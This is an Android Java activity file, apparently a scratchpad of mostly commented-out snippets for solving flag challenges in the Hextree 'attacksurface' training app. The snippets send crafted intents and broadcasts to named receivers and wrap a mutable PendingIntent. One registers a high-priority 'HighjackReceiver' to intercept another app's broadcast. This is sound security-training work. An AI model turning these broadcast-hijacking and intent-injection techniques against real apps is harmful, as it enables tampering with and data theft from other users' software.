package com.tur11ng.androidsecurityutils;

import static android.app.PendingIntent.FLAG_IMMUTABLE;
import static android.content.Intent.FLAG_DEBUG_LOG_RESOLUTION;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {

//    @Override
//    protected void onCreate(Bundle savedInstanceState) {
//        super.onCreate(savedInstanceState);
//        EdgeToEdge.enable(this);
//        setContentView(R.layout.activity_main);
//
//        Intent intent = new Intent();
//        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag22Activity"));
//
//        PendingIntent pendingIntent = PendingIntent.getActivity(this,0,intent,PendingIntent.FLAG_MUTABLE);
//        intent.putExtra("PENDING",pendingIntent);
//
//        ((Button) findViewById(R.id.button)).setOnClickListener(new View.OnClickListener() {
//            @Override
//            public void onClick(View v) {
//                startActivity(intent);
//            }
//        });
//        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
//            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
//            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
//            return insets;
//        });

//        Intent intent = new Intent();
//        intent.setAction("io.hextree.attacksurface.receivers.Flag16Receiver");
//        intent.putExtra("flag", "give-flag-16");
//        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag16Receiver");
//        intent.addFlags(Intent.FLAG_DEBUG_LOG_RESOLUTION);
//        sendBroadcast(intent);
//    }
//
//    @Override
//    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent intent){
//        super.onActivityResult(requestCode, resultCode, intent);
//        IntentLogger.log(intent);
//    }

    @Override
    protected void onCreate(Bundle savedInstanceState){
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);

//        // Create a simple intent and start an Activity with it
//        Intent intent = new Intent();
//        intent.setComponent(new ComponentName("INTENT_TARGET_APPLICATION_PACKAGE", "INTENT_TARGET_APPLICATION_CLASS"));
//        intent.setAction("INTENT_ACTION");
//        startActivity(intent);

//        // Chain of intents
//        Intent intent = new Intent();
//        Intent intent1 = new Intent();
//        Intent intent2 = new Intent();
//        intent2.putExtra("ExtraKey1", "ExtraValue1");
//        intent1.putExtra("ExtraKey2", "ExtraValue2");
//        intent.putExtra("android.intent.extra.INTENT", intent1);
//        intent.setComponent(new ComponentName("INTENT_TARGET_APPLICATION_PACKAGE", "INTENT_TARGET_APPLICATION_CLASS"));
//        startActivity(intent);

//        // Create a simple Intent, wrap it inside a Pending Intent and send it.
//        Intent intent = new Intent(this, MainActivity.class);
//        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
//        PendingIntent pendingIntent = PendingIntent.getActivity(
//                this,
//                0,
//                intent,
//                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
//        );
//        try {
//            pendingIntent.send();
//        } catch (PendingIntent.CanceledException e) {
//            throw new RuntimeException(e);
//        }

//        // Get the Intent that was used to launch the Activity
//        getIntent();

//        // Fast way to create an intent with a specific action and the Debug flags. You will need to check the LOGCAT for this.
//        Intent intent = new Intent("INTENT_ACTION");
//        intent.setFlags(FLAG_DEBUG_LOG_RESOLUTION);

//        IntentFilter intentFilter = new IntentFilter("io.hextree.broadcast.FREE_FLAG");
//        intentFilter.setPriority(10);
//
//        BroadcastReceiver highjackReceiver = new HighjackReceiver();
//        registerReceiver(
//                highjackReceiver,
//                intentFilter,
//                RECEIVER_EXPORTED
//        );

//        Intent intent = new Intent();
//        intent.setComponent(new ComponentName(
//                "io.hextree.attacksurface",
//                "io.hextree.attacksurface.receivers.Flag17Receiver"
//        ));//        intent.putExtra("flag", "give-flag-17");
//        intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.receivers.Flag17Receiver"));
//        sendOrderedBroadcast(intent, null, new BroadcastReceiver() {
//            @Override
//            public void onReceive(Context context, Intent intent) {
//                Log.d("onReceive", "IT HERE NOW!");
//                IntentLogger.log(intent);
//            }
//
//        }, null, 0, null, null);

//        // Send implicit broadcast
//        Intent intent = new Intent();
//        intent.setAction("ActionKey");
//        intent.putExtra("ExtraKey", true);
//        Bundle bundle = new Bundle();
//        bundle.putInt("BundleExtraKey", 1094795585);
//        bundle.putInt("BundleExtraKey1", 322376503);
//        intent.putExtra("BundleKey", bundle);
//        sendBroadcast(intent);

//        // Send explicit broadcast
//        Intent intent = new Intent();
//        intent.setComponent(new ComponentName(
//                "io.hextree.attacksurface",
//                "io.hextree.attacksurface.receivers.Flag19Widget"
//        ));
//        intent.setAction("ActionKey");
//        intent.putExtra("ExtraKey", true);
//        Bundle bundle = new Bundle();
//        bundle.putInt("BundleExtraKey", 1094795585);
//        bundle.putInt("BundleExtraKey1", 322376503);
//        intent.putExtra("BundleKey", bundle);
//        sendBroadcast(intent);

//        // Send ordered broadcast. The BroadcastReceiver that we register will be the last one
//        // in the chain that will be triggered
//        Intent intent = new Intent();
//        sendOrderedBroadcast(
//                intent,
//                null,
//                new BroadcastReceiver() {
//                    @Override
//                    public void onReceive(Context context, Intent resultIntent) {
//                        BroadcastReceiverLogger.log("BroadcastReceiver", this, context, intent);
//                    }
//                },
//                null,
//                0,
//                null,
//                null
//        );

//        // Dynamically register BroadcastReceiver
//        IntentFilter intentFilter = new IntentFilter("INTENT_ACTION");
//        intentFilter.setPriority(10);
//
//        BroadcastReceiver broadcastReceiver = new BroadcastReceiver() {
//            @Override
//            public void onReceive(Context context, Intent intent) {
//                BroadcastReceiverLogger.log("BroadcastReceiver", this, context, intent);
//            }
//        };
//        registerReceiver(
//                broadcastReceiver,
//                intentFilter,
//                RECEIVER_EXPORTED
//        );
    }
}
